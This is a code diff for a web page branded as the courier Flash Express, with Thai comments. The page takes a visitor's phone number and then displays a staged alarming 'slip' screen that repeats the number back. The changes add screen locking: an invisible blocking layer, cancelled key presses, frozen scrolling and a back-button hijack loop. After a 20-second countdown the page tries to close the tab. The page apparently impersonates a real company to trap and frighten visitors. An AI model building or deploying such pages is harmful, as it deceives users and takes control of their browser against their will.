@@ -6,7 +6,7 @@
   <link rel="icon" href="https://flashexpress.com/favicon.ico" type="image/x-icon">
   <title>Flash Express</title>
 
-  <!-- PWA สำหรับเต็มจอบน iPhone -->
+  <!-- รองรับเต็มจอใน iPhone -->
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="mobile-web-app-capable" content="yes">
@@ -23,9 +23,9 @@
       overflow-x: hidden;
       -webkit-user-select: none;
       user-select: none;
+      overscroll-behavior: none;
     }
 
-    /* กล่องกรอกเบอร์ */
     #inputBox {
       background: linear-gradient(180deg,#0f1724 0%, #0b1220 100%);
       padding: 20px;
@@ -96,7 +96,6 @@
     }
     @keyframes blink { to { opacity: 0.4; } }
 
-    /* สลิป */
     #overlay {
       position: fixed;
       inset: 0;
@@ -105,7 +104,7 @@
       flex-direction: column;
       align-items: center;
       z-index: 9999;
-      overflow-y: auto; /* ✅ เลื่อนดูได้ */
+      overflow-y: auto;
       overscroll-behavior: contain;
       padding: 30px 16px 60px;
       box-sizing: border-box;
@@ -132,20 +131,22 @@
     .text:nth-of-type(8) { animation-delay: 1.6s; }
     .text:nth-of-type(9) { animation-delay: 1.8s; }
     .text:nth-of-type(10){ animation-delay: 2.0s; }
+    .text:nth-of-type(11){ animation-delay: 2.2s; }
+    .text:nth-of-type(12){ animation-delay: 5.0s; }
 
     .red { color:#ff2020;text-shadow:0 0 10px rgba(255,0,0,0.7);}
     .green { color:#00ff66;text-shadow:0 0 12px rgba(0,255,100,0.6);}
     .gold { color:#ffde00;text-shadow:0 0 15px rgba(255,222,0,0.8);}
 
     #mainImg {
-      width: 95%;
-      max-width: 400px;
+      width: 70vw;
+      max-width: 320px;
       border-radius: 10px;
       box-shadow: 0 0 20px rgba(255,255,255,0.15);
       opacity: 0;
       transform: scale(0.95);
       transition: all 1.5s ease;
-      margin: 20px 0 50px;
+      margin: 20px 0 30px;
     }
     #mainImg.show { opacity: 1; transform: scale(1); }
 
@@ -168,7 +169,8 @@
       background: transparent;
       z-index: 100000;
       display: none;
-      pointer-events: all; /* กันคลิก */
+      pointer-events: all;
+      touch-action: none;
     }
   </style>
 </head>
@@ -222,22 +224,30 @@
         return;
       }
 
-      // 🔒 ล็อกปุ่มทุกอย่าง แต่เลื่อนดูได้
-      document.getElementById("lockLayer").style.display = "block";
+      // 🔒 ล็อกหน้าจอทั้งหมด
+      const lock = document.getElementById("lockLayer");
+      lock.style.display = "block";
       document.addEventListener("keydown", e => e.preventDefault(), { passive: false });
+      document.body.style.overflow = "hidden";
+      document.body.style.position = "fixed";
+
+      // ป้องกันการย้อนกลับ
       history.pushState(null, "", location.href);
       window.onpopstate = () => history.pushState(null, "", location.href);
 
+      // ซ่อนช่องกรอก
       document.getElementById("inputBox").style.display = "none";
       const loading = document.getElementById("loading");
       loading.style.display = "flex";
 
+      // แสดง overlay หลังโหลด 2 วิ
       setTimeout(()=>{
         loading.style.display = "none";
         const overlay = document.getElementById("overlay");
         overlay.style.display = "flex";
         document.getElementById("showPhone").textContent = phone;
 
+        // แสดงภาพหลัง 4 วิ
         setTimeout(()=> document.getElementById("mainImg").classList.add("show"), 4000);
 
         remaining = 20;
@@ -246,10 +256,17 @@
         timerId = setInterval(()=>{
           remaining--;
           document.getElementById("count").textContent = remaining;
+
+          // ครบ 20 วิ → ปิดหน้าเว็บ
           if(remaining <= 0){
             clearInterval(timerId);
-            document.getElementById("lockLayer").style.display = "none";
-            window.location.reload();
+            lock.style.display = "none";
+            document.body.style.overflow = "";
+            document.body.style.position = "";
+
+            // 🔁 พยายามปิดแท็บ / กลับหน้าเดิม
+            window.close(); // ถ้าเปิดจาก LINE จะปิดไม่ได้
+            history.back(); // กลับหน้าก่อนหน้า
           }
         },1000);
       },2000);
